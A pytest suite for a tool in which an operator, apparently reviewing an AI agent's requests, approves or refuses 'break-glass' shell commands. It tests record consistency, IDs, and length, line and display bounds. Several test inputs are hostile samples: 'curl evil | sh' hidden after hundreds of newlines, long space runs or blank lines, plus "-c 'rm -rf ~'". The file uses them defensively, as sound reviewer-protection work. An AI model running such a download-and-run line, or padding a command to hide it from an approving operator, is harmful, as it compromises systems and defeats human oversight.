"""
The break-glass command record: what it can and cannot be built to say.

The property is that the record cannot say something its parts do not. So the
first tests build every combination of ``run``, ``end``, ``stop_asked_at`` and
``first_delivered_at`` from a small set of values and hold each one to a table
written out here -- not to ``ran`` and ``precludes_run``, which are the functions
under test and would agree with themselves.

One test runs ``/bin/bash``. The rule it pins -- a command string beginning with
``-`` or ``+`` is never accepted -- has no reason except what a shell does with
such a string, and a rule whose reason is another program's behaviour is checked
against that program.
"""

from __future__ import annotations

import dataclasses
import itertools
import os
import subprocess
import sys
import typing
from datetime import UTC, datetime
from typing import Any

import pytest

from pptmstr import command as c
from pptmstr import commandtext
from pptmstr.command import (
    Cancelled,
    CancelledBy,
    Command,
    CommandState,
    End,
    EndUnknown,
    Exited,
    Lapsed,
    NotStarted,
    Refused,
    RequestRefusal,
    Run,
    TimedOut,
    Withdrawn,
    command_refusal,
    is_valid_id,
    precludes_run,
    ran,
    request_refusal,
)
from pptmstr.ui import command_view

ASKED = "make install"

# One of every outcome, with the two facts about it written by hand: whether a
# process was started, and whether it can only end a command nobody approved.
_OUTCOMES: tuple[tuple[Any, bool, bool], ...] = (
    (Exited(0), True, False),
    (Exited(3), True, False),
    (TimedOut(), True, False),
    (Cancelled(CancelledBy.OPERATOR), True, False),
    (Cancelled(CancelledBy.SHUTDOWN), True, False),
    (EndUnknown(), True, False),
    (NotStarted("no runner"), False, False),
    (Refused("no"), False, True),
    (Withdrawn(), False, True),
    (Lapsed(), False, True),
)


def _run(text: str = ASKED, **fields: Any) -> Run:
    base: dict[str, Any] = dict(
        text=text, shell="/bin/bash", cwd="/work", timeout_s=600, started_at=2.0
    )
    return Run(**{**base, **fields})


def _command(**fields: Any) -> Command:
    base: dict[str, Any] = dict(
        id="cmd-20261013T101500Z-0123456789ab",
        asker=("s", "a1"),
        asked=ASKED,
        reason="the venv is stale",
        expects="site-packages changes",
        asked_at=1.0,
    )
    return Command(**{**base, **fields})


def _combinations() -> list[dict[str, Any]]:
    runs = (None, _run(), _run("make install PREFIX=/usr/local"))
    ends = (None, *(End(outcome, at=4.0) for outcome, _, _ in _OUTCOMES))
    return [
        dict(run=run, end=end, stop_asked_at=stop, first_delivered_at=delivered)
        for run, end, stop, delivered in itertools.product(runs, ends, (None, 3.0), (None, 5.0))
    ]


def _why_impossible(fields: dict[str, Any]) -> str | None:
    """
    The table: what this combination would claim that cannot have happened.
    """
    run, end = fields["run"], fields["end"]
    if fields["stop_asked_at"] is not None and run is None:
        return "a stop with nothing to stop"
    if end is None:
        return None
    started, asked_only = next((s, a) for o, s, a in _OUTCOMES if o == end.outcome)
    if started and run is None:
        return "an outcome of a run with no run"
    if asked_only and run is not None:
        return "approved, and ended as though it never was"
    return None


# -- the property ------------------------------------------------------------------


def test_every_combination_either_has_one_consistent_reading_or_cannot_be_built() -> None:
    built = refused = 0
    for fields in _combinations():
        if _why_impossible(fields) is not None:
            with pytest.raises(ValueError):
                _command(**fields)
            refused += 1
            continue
        cmd = _command(**fields)
        built += 1
        run, end = fields["run"], fields["end"]
        expected = (
            CommandState.ENDED
            if end is not None
            else CommandState.RUNNING if run is not None else CommandState.ASKED
        )
        assert cmd.state is expected
        assert cmd.is_open is (expected is not CommandState.ENDED)
        assert cmd.edited is (run is not None and run.text != ASKED)
        # Running means there is a string that is running.
        if cmd.state is CommandState.RUNNING:
            assert cmd.run is not None and cmd.run.text.strip()
        # Ended means there is an outcome, and nothing ended is still open.
        if cmd.state is CommandState.ENDED:
            assert cmd.end is not None and isinstance(cmd.end.outcome, typing.get_args(c.Outcome))
    # Both arms were exercised, and by more than a token case each.
    assert built > 40 and refused > 40, (built, refused)


def test_the_state_and_the_edit_are_read_off_the_parts_and_not_stored() -> None:
    names = {f.name for f in dataclasses.fields(Command)}
    assert names == {
        "id",
        "asker",
        "asked",
        "reason",
        "expects",
        "asked_at",
        "run",
        "stop_asked_at",
        "end",
        "first_delivered_at",
    }
    assert not names & {"state", "edited", "is_open", "status"}
    assert {f.name for f in dataclasses.fields(End)} == {
        "outcome",
        "at",
        "duration_s",
        "output_bytes",
        "tail",
        "leftover",
        "unconfirmed",
    }
    assert {f.name for f in dataclasses.fields(Run)} == {
        "text",
        "shell",
        "cwd",
        "timeout_s",
        "started_at",
    }


def test_a_replacement_is_held_to_the_same_rule_as_a_first_construction() -> None:
    # The reducer builds the next record with ``replace``; if that skipped the
    # check, every impossible record would be one step away.
    asked = _command()
    with pytest.raises(ValueError):
        dataclasses.replace(asked, end=End(Exited(0), at=4.0))
    with pytest.raises(ValueError):
        dataclasses.replace(asked, stop_asked_at=3.0)
    running = dataclasses.replace(asked, run=_run())
    with pytest.raises(ValueError):
        dataclasses.replace(running, end=End(Refused("no"), at=4.0))
    with pytest.raises(ValueError):
        dataclasses.replace(running, end=End(Withdrawn(), at=4.0))
    ended = dataclasses.replace(running, end=End(Exited(0), at=4.0))
    assert ended.state is CommandState.ENDED and not ended.is_open
    with pytest.raises(dataclasses.FrozenInstanceError):
        ended.end = None  # type: ignore[misc]


def test_edited_compares_bytes_and_is_false_until_something_ran() -> None:
    assert _command().edited is False
    assert _command(run=_run(ASKED)).edited is False
    # A trailing space is an edit. Nothing is normalised before the comparison,
    # because the shell is given the string and not a tidied copy of it.
    assert _command(run=_run(ASKED + " ")).edited is True
    assert _command(run=_run("make  install")).edited is True
    # Two strings that draw alike and differ in code points.
    assert _command(asked="café", run=_run("café")).edited is True
    # A refusal of an asked command ran nothing, so nothing was edited.
    assert _command(end=End(Refused("no"), at=4.0)).edited is False


def test_the_session_is_the_askers() -> None:
    assert _command(asker=("s9", None)).session_id == "s9"
    assert _command(asker=("s9", "a4")).session_id == "s9"


# -- outcomes ----------------------------------------------------------------------


def test_every_outcome_is_on_one_side_of_ran_and_the_table_names_them_all() -> None:
    members = typing.get_args(c.Outcome)
    assert {type(o) for o, _, _ in _OUTCOMES} == set(members)
    assert len(members) == 8
    for outcome, started, asked_only in _OUTCOMES:
        assert ran(outcome) is started, outcome
        assert precludes_run(outcome) is asked_only, outcome
        # Nothing both ran and could only have ended an unapproved command.
        assert not (started and asked_only)
    # The one outcome on neither side, and why it has to be: the run is recorded
    # before anything starts.
    neither = [type(o) for o, s, a in _OUTCOMES if not s and not a]
    assert neither == [NotStarted]
    assert _command(end=End(NotStarted("no shell"), at=4.0)).state is CommandState.ENDED
    assert _command(run=_run(), end=End(NotStarted("no runner"), at=4.0)).run is not None


def test_the_runtime_list_of_outcomes_is_the_union() -> None:
    # Two spellings of one set: the union mypy reads and the tuple ``End`` tests
    # against at runtime.
    assert c._OUTCOME_TYPES == typing.get_args(c.Outcome)


@pytest.mark.parametrize("not_an_outcome", [None, "exited", 0, Exited, CancelledBy.OPERATOR])
def test_an_end_with_no_outcome_cannot_be_built(not_an_outcome: Any) -> None:
    with pytest.raises(ValueError):
        End(not_an_outcome, at=4.0)
    assert "outcome" in {
        f.name
        for f in dataclasses.fields(End)
        if f.default is dataclasses.MISSING and f.default_factory is dataclasses.MISSING
    }


def test_an_outcome_that_started_nothing_has_no_output() -> None:
    for outcome, started, _ in _OUTCOMES:
        if started:
            end = End(outcome, at=4.0, duration_s=1.5, output_bytes=7, tail="built\n")
            assert (end.output_bytes, end.tail) == (7, "built\n")
            continue
        with pytest.raises(ValueError):
            End(outcome, at=4.0, output_bytes=1)
        with pytest.raises(ValueError):
            End(outcome, at=4.0, tail="x")
        assert End(outcome, at=4.0).output_bytes == 0
    with pytest.raises(ValueError):
        End(Exited(0), at=4.0, output_bytes=-1)
    with pytest.raises(ValueError):
        End(Exited(0), at=4.0, duration_s=-0.5)


def test_who_cancelled_is_one_of_two() -> None:
    assert {m.value for m in CancelledBy} == {"operator", "shutdown"}
    assert Cancelled(CancelledBy.OPERATOR) != Cancelled(CancelledBy.SHUTDOWN)


# -- the run -----------------------------------------------------------------------


@pytest.mark.parametrize(
    "text", ["", " ", "\n\t", "-x", "+x", "-", "--version", "a\x00b", "echo \ud800", "\udc80"]
)
def test_no_run_exists_whose_text_a_shell_would_not_read_as_a_command(text: str) -> None:
    with pytest.raises(ValueError):
        _run(text)


def test_a_run_is_not_held_to_the_length_the_request_is() -> None:
    long = "x" * (c.MAX_COMMAND_CHARS + 1)
    assert command_refusal(long) is RequestRefusal.TOO_LONG
    assert _run(long).text == long
    assert c._UNRUNNABLE == {
        RequestRefusal.EMPTY,
        RequestRefusal.NUL,
        RequestRefusal.LONE_SURROGATE,
        RequestRefusal.LEADS_WITH_OPTION,
    }


def test_a_run_names_its_shell_and_is_bounded() -> None:
    with pytest.raises(ValueError):
        _run(shell="")
    for unbounded in (0, -1, float("nan")):
        with pytest.raises(ValueError):
            _run(timeout_s=unbounded)
    assert _run(timeout_s=120).timeout_s == 120


# -- what may be asked -------------------------------------------------------------

_AT_LIMIT = "x" * c.MAX_COMMAND_CHARS


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("make install", None),
        ("", RequestRefusal.EMPTY),
        (" ", RequestRefusal.EMPTY),
        ("\n", RequestRefusal.EMPTY),
        (" \t\r\n", RequestRefusal.EMPTY),
        ("  ", RequestRefusal.EMPTY),
        ("-x", RequestRefusal.LEADS_WITH_OPTION),
        ("+x", RequestRefusal.LEADS_WITH_OPTION),
        ("-", RequestRefusal.LEADS_WITH_OPTION),
        ("--", RequestRefusal.LEADS_WITH_OPTION),
        ("--version", RequestRefusal.LEADS_WITH_OPTION),
        ("-c 'rm -rf ~'", RequestRefusal.LEADS_WITH_OPTION),
        ("+o posix", RequestRefusal.LEADS_WITH_OPTION),
        ("-x; make install", RequestRefusal.LEADS_WITH_OPTION),
        # Only the first CHARACTER counts: the shell is given the string as it
        # is, and behind whitespace ``-x`` is a command name.
        (" -x", None),
        ("\t-x", None),
        (" +x", None),
        # Behind a newline it is a command name too, and the line ahead of it
        # is what is refused.
        ("\n-x", RequestRefusal.BLANK_LINE),
        # A dash anywhere else is an argument.
        ("ls -la", None),
        ("a-b", None),
        # Look-alikes of the two characters are not the two characters, and the
        # shell agrees.
        ("−x", None),
        ("－x", None),
        ("a\x00b", RequestRefusal.NUL),
        ("\x00", RequestRefusal.NUL),
        ("echo \ud800", RequestRefusal.LONE_SURROGATE),
        ("echo \udfff", RequestRefusal.LONE_SURROGATE),
        ("echo \udc80", RequestRefusal.LONE_SURROGATE),
        # The characters on either side of the surrogate block, and one beyond
        # the first plane, are characters.
        ("echo ퟿", None),
        ("echo \U0001f600", None),
        (_AT_LIMIT, None),
        (_AT_LIMIT + "x", RequestRefusal.TOO_LONG),
        # Other control characters are the display's to make visible, not a
        # reason to refuse.
        ("printf 'a\\n'\recho b", None),
        ("echo a\necho b", None),
    ],
)
def test_what_is_never_a_command(text: str, expected: RequestRefusal | None) -> None:
    assert command_refusal(text) is expected
    assert request_refusal(text, "why", "what") is expected


def test_a_string_that_is_wrong_twice_is_told_the_thing_to_fix_first() -> None:
    long = "x" * (c.MAX_COMMAND_CHARS + 1)
    assert command_refusal("-" + long) is RequestRefusal.LEADS_WITH_OPTION
    assert command_refusal(long + "\x00") is RequestRefusal.NUL
    assert command_refusal("-\x00") is RequestRefusal.NUL
    assert command_refusal(" " * (c.MAX_COMMAND_CHARS + 1)) is RequestRefusal.EMPTY


def test_the_reason_and_the_expectation_are_bounded_and_the_command_is_judged_first() -> None:
    reason, expects = "r" * c.MAX_REASON_CHARS, "e" * c.MAX_EXPECTS_CHARS
    assert request_refusal("make", reason, expects) is None
    assert request_refusal("make", reason + "r", expects) is RequestRefusal.REASON_TOO_LONG
    assert request_refusal("make", reason, expects + "e") is RequestRefusal.EXPECTS_TOO_LONG
    assert request_refusal("make", reason + "r", expects + "e") is RequestRefusal.REASON_TOO_LONG
    assert request_refusal("-x", reason + "r", expects + "e") is RequestRefusal.LEADS_WITH_OPTION
    # Neither is required to say anything: persuasion is not the gate.
    assert request_refusal("make", "", "") is None


def test_every_refusal_has_its_own_sentence_and_the_bounds_in_them_are_the_bounds() -> None:
    sentences = {member: member.sentence for member in RequestRefusal}
    assert set(c._SENTENCES) == set(RequestRefusal)
    assert all(s and s == s.strip() and "\n" not in s for s in sentences.values())
    assert len(set(sentences.values())) == len(RequestRefusal)
    assert f"{c.MAX_COMMAND_CHARS:,}" in RequestRefusal.TOO_LONG.sentence
    assert f"{c.MAX_REASON_CHARS:,}" in RequestRefusal.REASON_TOO_LONG.sentence
    assert f"{c.MAX_EXPECTS_CHARS:,}" in RequestRefusal.EXPECTS_TOO_LONG.sentence
    assert "'-'" in RequestRefusal.LEADS_WITH_OPTION.sentence
    assert "'+'" in RequestRefusal.LEADS_WITH_OPTION.sentence
    assert len({member.value for member in RequestRefusal}) == len(RequestRefusal)


_BASH = "/bin/bash"
_MARK = "the-next-argument-ran"


def _bash_c(text: str) -> subprocess.CompletedProcess[str]:
    # The runner's argument list with one more argument after the string. If
    # bash reads ``text`` as the command, the extra argument is ``$0`` and never
    # runs; if it reads ``text`` as options, the extra argument is the command.
    return subprocess.run(
        [_BASH, "--noprofile", "--norc", "-c", text, f"echo {_MARK}"],
        stdin=subprocess.DEVNULL,
        capture_output=True,
        text=True,
        timeout=20,
        check=False,
    )


@pytest.mark.skipif(not os.access(_BASH, os.X_OK), reason="no /bin/bash to ask")
def test_bash_reads_a_leading_dash_or_plus_as_options_and_nothing_else_so() -> None:
    for text in ("-x", "+x", "-e"):
        assert command_refusal(text) is RequestRefusal.LEADS_WITH_OPTION
        result = _bash_c(text)
        assert _MARK in result.stdout, (text, result)
    # Alone, with no argument after it for bash to take as the command.
    alone = subprocess.run(
        [_BASH, "--noprofile", "--norc", "-c", "-x"],
        stdin=subprocess.DEVNULL,
        capture_output=True,
        text=True,
        timeout=20,
        check=False,
    )
    assert alone.returncode == 2 and "option requires an argument" in alone.stderr
    # Everything the function lets through with a dash near the front is read as
    # a command: bash looks it up, does not find it, and the extra argument does
    # not run.
    for text in (" -x", "\t-x", "\n-x", " +x", "−x"):
        assert command_refusal(text) is not RequestRefusal.LEADS_WITH_OPTION
        assert command_refusal(text.replace("\n", " ")) is None
        result = _bash_c(text)
        assert _MARK not in result.stdout, (text, result)
        assert result.returncode == 127 and "command not found" in result.stderr, (text, result)


# -- ids ---------------------------------------------------------------------------


def test_an_id_minted_from_the_two_constants_is_valid() -> None:
    stamp = datetime(2026, 10, 13, 10, 15, 0, tzinfo=UTC).strftime(c.ID_TIME_FORMAT)
    assert stamp == "20261013T101500Z"
    assert is_valid_id(f"cmd-{stamp}-{'0123456789abcdef'[: c.ID_HEX_CHARS]}")
    assert is_valid_id("cmd-20261013T101500Z-0123456789ab")
    assert c.ID_HEX_CHARS == 12


@pytest.mark.parametrize(
    "bad",
    [
        "",
        "cmd-",
        "cmd-20261013T101500Z-0123456789a",
        "cmd-20261013T101500Z-0123456789abc",
        "cmd-20261013T101500Z-0123456789AB",
        "cmd-20261013T101500Z-0123456789ag",
        "cmd-20261013T101500-0123456789ab",
        "cmd-20261013101500Z-0123456789ab",
        "CMD-20261013T101500Z-0123456789ab",
        "d-20261013T101500Z-0123456789ab",
        "cmd-20261013T101500Z-0123456789ab\n",
        " cmd-20261013T101500Z-0123456789ab",
        "cmd-20261013T101500Z-0123456789ab/",
        "cmd-20261013T101500Z-0123456789ab/..",
        "../cmd-20261013T101500Z-0123456789ab",
        "cmd-20261013T101500Z-../../../etc",
        "cmd-2026101٣T101500Z-0123456789ab",
        "cmd-20261013T101500Z-0123456789aｂ",
        "cmd-20261013T101500Z-0123456789ab\x00",
        ".",
        "..",
        None,
        12,
        b"cmd-20261013T101500Z-0123456789ab",
    ],
)
def test_nothing_else_is_an_id_and_so_nothing_else_names_a_directory(bad: Any) -> None:
    assert is_valid_id(bad) is False


# -- bounds ------------------------------------------------------------------------


def test_the_bounds_are_the_ones_the_plan_proposed() -> None:
    assert c.MAX_COMMAND_CHARS == 2_000
    assert (c.MAX_REASON_CHARS, c.MAX_EXPECTS_CHARS) == (1_000, 1_000)
    assert (c.MAX_TAIL_CHARS, c.MAX_TAIL_LINES) == (4_000, 60)
    assert (c.MAX_OPEN_PER_ASKER, c.MAX_OPEN_SUBAGENTS) == (3, 8)
    assert c.TIMEOUT_CHOICES_S == (120, 600, 1_800, 7_200)
    assert c.DEFAULT_TIMEOUT_S == 600


def test_the_bounds_agree_with_each_other() -> None:
    assert c.DEFAULT_TIMEOUT_S in c.TIMEOUT_CHOICES_S
    assert list(c.TIMEOUT_CHOICES_S) == sorted(set(c.TIMEOUT_CHOICES_S))
    assert all(_run(timeout_s=choice).timeout_s == choice for choice in c.TIMEOUT_CHOICES_S)
    # One asker cannot be allowed more than the session's sub-agents are between them.
    assert 0 < c.MAX_OPEN_PER_ASKER <= c.MAX_OPEN_SUBAGENTS


# -- the module --------------------------------------------------------------------


def test_importing_the_record_imports_only_what_a_command_is_measured_with() -> None:
    # ``model.py`` is where these records will be held, so the record must not
    # import it at runtime. The two it does import are what a command's block
    # and breakdown are drawn with -- the bounds are on the string as drawn, and
    # a second copy of the escaping or of the splitter would be free to drift
    # from the one the row uses. Both are pure and import nothing else of
    # pptmstr's, which the list being exactly this long is what holds them to.
    probe = (
        "import sys, pptmstr.command\n"
        "print(sorted(m for m in sys.modules if m.startswith('pptmstr')))\n"
    )
    result = subprocess.run(
        [sys.executable, "-c", probe], capture_output=True, text=True, timeout=60, check=True
    )
    assert result.stdout.strip() == (
        "['pptmstr', 'pptmstr.command', 'pptmstr.commandtext', 'pptmstr.shellscan']"
    )


# -- what a run left, and what was found of it ------------------------------------


def test_leftover_is_only_an_exits_and_unconfirmed_only_a_runs() -> None:
    assert End(c.Exited(0), at=1.0, leftover=0).remarks == ()
    assert End(c.Exited(0), at=1.0, leftover=None).remarks == ()
    one = End(c.Exited(3), at=1.0, leftover=1).remarks
    assert one == (
        "1 leftover process of its session, still running when its shell exited, "
        "was ended with it",
    )
    (two,) = End(c.Exited(0), at=1.0, leftover=2).remarks
    assert two.startswith("2 leftover processes") and "were ended" in two
    both = End(c.Exited(0), at=1.0, leftover=2, unconfirmed="still there").remarks
    assert both[1] == "NOT CONFIRMED DEAD: still there"
    for outcome in (c.TimedOut(), c.Cancelled(c.CancelledBy.OPERATOR), c.EndUnknown()):
        assert End(outcome, at=1.0, unconfirmed="x").unconfirmed == "x"
        with pytest.raises(ValueError, match="leftover"):
            End(outcome, at=1.0, leftover=0)
    with pytest.raises(ValueError, match="leftover"):
        End(c.Exited(0), at=1.0, leftover=-1)
    for outcome in (c.NotStarted("x"), c.Refused("x"), c.Withdrawn(), c.Lapsed()):
        with pytest.raises(ValueError, match="unconfirmed"):
            End(outcome, at=1.0, unconfirmed="x")
    with pytest.raises(ValueError, match="unconfirmed"):
        End(c.TimedOut(), at=1.0, unconfirmed="")


def test_a_survivor_makes_an_ended_command_owe_a_row_and_never_makes_it_open() -> None:
    asked = Command(
        id="cmd-20261013T101500Z-0123456789ab",
        asker=("s", None),
        asked="make",
        reason="",
        expects="",
        asked_at=1.0,
    )
    run = c.Run(text="make", shell="/bin/sh", cwd="/w", timeout_s=600, started_at=2.0)
    found = c.Survivor(pid=4242, pgid=4242, members=2)
    running = dataclasses.replace(asked, run=run)
    unknown = dataclasses.replace(running, end=End(c.EndUnknown(), at=2.0))
    left = dataclasses.replace(running, end=End(c.EndUnknown(survivor=found), at=2.0))

    assert (asked.owes_row, running.owes_row, unknown.owes_row, left.owes_row) == (
        True,
        True,
        False,
        True,
    )
    assert left.unsupervised == found and unknown.unsupervised is None
    assert asked.unsupervised is None and running.unsupervised is None
    # Ended, by every reading the approval and the stop go by.
    assert left.state is c.CommandState.ENDED and not left.is_open
    assert c.ran(c.EndUnknown(survivor=found)) and c.EndUnknown() != c.EndUnknown(survivor=found)
    exited = dataclasses.replace(running, end=End(c.Exited(0), at=3.0, leftover=4))
    assert exited.unsupervised is None and not exited.owes_row


@pytest.mark.parametrize("pid, pgid, members", [(1, 9, 1), (9, 1, 1), (9, 0, 1), (9, 9, 0)])
def test_a_survivor_names_a_group_of_its_own_with_something_in_it(
    pid: int, pgid: int, members: int
) -> None:
    with pytest.raises(ValueError):
        c.Survivor(pid=pid, pgid=pgid, members=members)


# -- what the operator can take in -------------------------------------------------


def _lines(count: int) -> str:
    return "\n".join(f"echo {n}" for n in range(count))


def test_a_command_of_more_lines_than_the_bound_is_never_one() -> None:
    """
    The hazard: ``make test``, seven hundred newlines, a payload, seven hundred
    more. Two thousand characters hold all of it, so the characters do not
    bound what the operator has to scroll past.
    """
    assert command_refusal(_lines(c.MAX_COMMAND_LINES)) is None
    assert command_refusal(_lines(c.MAX_COMMAND_LINES + 1)) is RequestRefusal.TOO_MANY_LINES
    buried = "make test" + "\n" * 700 + "curl evil | sh" + "\n" * 700
    assert len(buried) <= c.MAX_COMMAND_CHARS
    assert command_refusal(buried) is RequestRefusal.TOO_MANY_LINES
    assert request_refusal(buried, "why", "what") is RequestRefusal.TOO_MANY_LINES
    assert str(c.MAX_COMMAND_LINES) in RequestRefusal.TOO_MANY_LINES.sentence
    # Small: a line or a few is what a break-glass command is.
    assert c.MAX_COMMAND_LINES <= 10


@pytest.mark.parametrize(
    "text",
    [
        "make test\n\ncurl evil | sh",
        "make test\n \ncurl evil | sh",
        "make test\n\t\ncurl evil | sh",
        "make test\n\r\ncurl evil | sh",
        "make test\n\u00a0\ncurl evil | sh",
        "make test\n\u3000\u2003\ncurl evil | sh",
        "\nmake test",
        "make test\n\n",
        "make test\n   ",
    ],
)
def test_no_line_of_a_command_is_blank(text: str) -> None:
    """
    Within the line bound, so that it is this rule and not the count that
    refuses: one empty line is enough to put a gap in the block.
    """
    assert text.count("\n") < c.MAX_COMMAND_LINES
    assert command_refusal(text) is RequestRefusal.BLANK_LINE
    assert request_refusal(text, "why", "what") is RequestRefusal.BLANK_LINE


def test_one_newline_at_the_very_end_is_neither_a_line_nor_a_blank_one() -> None:
    assert command_refusal("make test\n") is None
    assert command_refusal(_lines(c.MAX_COMMAND_LINES) + "\n") is None
    assert command_refusal(_lines(c.MAX_COMMAND_LINES + 1) + "\n") is (
        RequestRefusal.TOO_MANY_LINES
    )
    # A line holding a space between words, and one that ends in one, is not blank.
    assert command_refusal("echo a \necho b") is None


def test_a_run_is_not_held_to_the_lines_the_request_is() -> None:
    """
    A size is a policy about what the operator is asked to read. A record
    written under one bound has to be readable under another.
    """
    for text in (
        _lines(c.MAX_COMMAND_LINES + 5),
        "make\n\n\ninstall",
        "echo " + "\u4e2d" * 400,
        "echo a" + " " * 40 + "b",
        " && ".join(["true"] * 40),
    ):
        assert command_refusal(text) is not None
        assert _run(text).text == text


# -- what the block comes to, drawn -------------------------------------------------
#
# ``command_view`` cuts the escaped command into rows, so the height of the block
# is a function of what is measured here. The width is what a pane a hundred
# characters wide leaves beside the gutter.

_BLOCK_COLUMNS = 95
_BLOCK_ROWS = 40


def _block_rows(text: str) -> list[str]:
    return [row.text for row in command_view.block_rows(text, _BLOCK_COLUMNS)]


def test_a_command_is_bounded_by_what_it_comes_to_escaped_and_not_by_its_characters() -> None:
    """
    The hazard: 1,900 characters outside ASCII are under the character bound
    and are 15,000 columns of escapes, a hundred and fifty rows of block.
    """
    wide = "echo " + "\u4e2d" * 1_900
    assert len(wide) <= c.MAX_COMMAND_CHARS
    assert command_refusal(wide) is RequestRefusal.SHOWN_TOO_LONG
    assert request_refusal(wide, "why", "what") is RequestRefusal.SHOWN_TOO_LONG

    # The bound is on ``visible``'s length, to the character.
    fits = "\u4e2d" * (c.MAX_COMMAND_SHOWN_CHARS // 8)
    assert len(commandtext.visible(fits)) == c.MAX_COMMAND_SHOWN_CHARS
    assert command_refusal(fits) is None
    assert command_refusal(fits + "x") is RequestRefusal.SHOWN_TOO_LONG
    # A backslash is two, a tab four, and a space ending a line four.
    assert command_refusal("a" + "\\" * 1_008) is RequestRefusal.SHOWN_TOO_LONG
    assert command_refusal("a" + "\t" * 504) is RequestRefusal.SHOWN_TOO_LONG
    assert command_refusal("a" + " " * 504) is RequestRefusal.SHOWN_TOO_LONG
    assert command_refusal("a" + " " * 503) is None
    # Every command the character bound lets through whose characters draw as
    # themselves is let through by this one, at the most lines there may be.
    assert command_refusal(_AT_LIMIT) is None
    lines = ["x"] * (c.MAX_COMMAND_LINES - 1)
    tallest = "\n".join([*lines, "x" * (c.MAX_COMMAND_CHARS - 2 * len(lines) - 1)]) + "\n"
    assert len(tallest) == c.MAX_COMMAND_CHARS
    assert len(commandtext.visible(tallest)) == c.MAX_COMMAND_SHOWN_CHARS
    assert command_refusal(tallest) is None
    assert f"{c.MAX_COMMAND_SHOWN_CHARS:,}" in RequestRefusal.SHOWN_TOO_LONG.sentence


def test_a_run_of_spaces_longer_than_the_bound_is_never_in_a_command() -> None:
    """
    The hazard: one line holding 1,900 spaces is nineteen rows of nothing
    between its first word and its last.
    """
    padded = "echo a" + " " * 1_900 + "; curl evil | sh"
    assert len(padded) <= c.MAX_COMMAND_CHARS
    assert command_refusal(padded) is RequestRefusal.SPACE_RUN
    assert request_refusal(padded, "why", "what") is RequestRefusal.SPACE_RUN

    at = "x" + " " * c.MAX_COMMAND_SPACE_RUN + "y"
    assert command_refusal(at) is None
    assert command_refusal(at.replace(" y", "  y")) is RequestRefusal.SPACE_RUN
    # An indent is a run like any other, on the first line and on a later one.
    assert command_refusal(" " * (c.MAX_COMMAND_SPACE_RUN + 1) + "x") is RequestRefusal.SPACE_RUN
    assert command_refusal("a\n" + " " * (c.MAX_COMMAND_SPACE_RUN + 1) + "x") is (
        RequestRefusal.SPACE_RUN
    )
    # Spaces ending a line are drawn, each as an escape, and are not this rule's.
    assert command_refusal("x" + " " * (c.MAX_COMMAND_SPACE_RUN + 1)) is None
    assert command_refusal("x" + " " * (c.MAX_COMMAND_SPACE_RUN + 1) + "\ny") is None
    # Narrower than the narrowest block, so no row of one is ever all spaces.
    assert c.MAX_COMMAND_SPACE_RUN < command_view.MIN_COLUMNS
    assert str(c.MAX_COMMAND_SPACE_RUN) in RequestRefusal.SPACE_RUN.sentence


def test_a_command_of_more_segments_than_the_bound_is_never_one() -> None:
    """
    The hazard: 165 commands joined by ``&&`` on one line are nine rows of
    block and 165 rows of breakdown, with the presses under all of them.
    """
    chained = " && ".join(["a"] * 165)
    assert len(chained) <= c.MAX_COMMAND_CHARS
    assert command_refusal(chained) is RequestRefusal.TOO_MANY_SEGMENTS

    for joiner in (" && ", " || ", "; ", " | "):
        at = joiner.join(["true"] * c.MAX_COMMAND_SEGMENTS)
        assert command_refusal(at) is None, joiner
        assert command_refusal(at + joiner + "true") is RequestRefusal.TOO_MANY_SEGMENTS, joiner
    # Counted as the row's breakdown counts them, so an operator inside quotes
    # is a character of an argument and not a cut.
    quoted = "grep -E '" + "|".join(["x"] * 40) + "' f"
    assert command_refusal(quoted) is None
    assert len(commandtext.breakdown(quoted).segments) == 1
    assert len(commandtext.breakdown(chained).segments) == 165
    assert str(c.MAX_COMMAND_SEGMENTS) in RequestRefusal.TOO_MANY_SEGMENTS.sentence


def _worst_blocks() -> list[str]:
    """
    Commands made to be tall, each as large as it may be and still be accepted.
    """
    shown, chars = c.MAX_COMMAND_SHOWN_CHARS, c.MAX_COMMAND_CHARS
    per_line = chars // c.MAX_COMMAND_LINES
    # A cut is not made beside a space where it can be made elsewhere, so
    # pairs of letters among single ones are what would pull a cut leftwards.
    pulled = ("ab" + " x" * 47) * 30
    spaced = ("x" + " " * c.MAX_COMMAND_SPACE_RUN) * 200
    return [
        "x" * chars,
        "\u4e2d" * (shown // 8),
        "\U0010ffff" * (shown // 10),
        pulled[:chars].rstrip(),
        spaced[: chars - 1] + "x",
        "\n".join(["x" * (per_line - 3)] * c.MAX_COMMAND_LINES),
        "\n".join([pulled[: per_line - 3].rstrip()] * c.MAX_COMMAND_LINES),
        "\n".join(["\u4e2d" * ((per_line - 3) // 8)] * c.MAX_COMMAND_LINES),
    ]


def test_the_block_of_the_largest_command_there_can_be_is_forty_rows_at_a_hundred_columns() -> None:
    """
    The bounds together: nothing ``command_refusal`` accepts draws a block
    taller than this, whatever it is made of. Not rendered -- counted off the
    rows ``command_view`` would draw.
    """
    for text in _worst_blocks():
        assert command_refusal(text) is None, text[:40]
        rows = _block_rows(text)
        assert len(rows) <= _BLOCK_ROWS, (text[:40], len(rows))
        assert all(row.strip() for row in rows), text[:40]
    # By arithmetic as well as by example: every row but the last of a line is
    # at least three quarters of the block wide.
    least = _BLOCK_COLUMNS - _BLOCK_COLUMNS // 4
    assert -(-c.MAX_COMMAND_SHOWN_CHARS // least) + c.MAX_COMMAND_LINES <= _BLOCK_ROWS


def test_what_the_new_bounds_refuse_was_tall_before_them() -> None:
    """
    The three commands of the finding, measured: each is over the forty rows somewhere.
    """
    assert len(_block_rows("echo " + "\u4e2d" * 1_900)) > 150
    blank = [row for row in _block_rows("echo a" + " " * 1_900 + "b") if not row.strip()]
    assert len(blank) >= 19


def test_the_reason_and_the_expectation_are_bounded_in_lines_too() -> None:
    """
    The hazard: a reason of a thousand newlines is under the character bound
    and puts the presses a thousand rows below the command.
    """
    tall = "\n" * 999
    assert len(tall) <= c.MAX_REASON_CHARS
    assert request_refusal("make", tall, "what") is RequestRefusal.REASON_TOO_MANY_LINES
    assert request_refusal("make", "why", tall) is RequestRefusal.EXPECTS_TOO_MANY_LINES

    reason = "\n".join(["r"] * c.MAX_REASON_LINES)
    expects = "\n".join(["e"] * c.MAX_EXPECTS_LINES)
    assert request_refusal("make", reason, expects) is None
    assert request_refusal("make", reason + "\nr", expects) is (
        RequestRefusal.REASON_TOO_MANY_LINES
    )
    assert request_refusal("make", reason, expects + "\ne") is (
        RequestRefusal.EXPECTS_TOO_MANY_LINES
    )
    # Every break a text can be drawn with is a line: not only the newline.
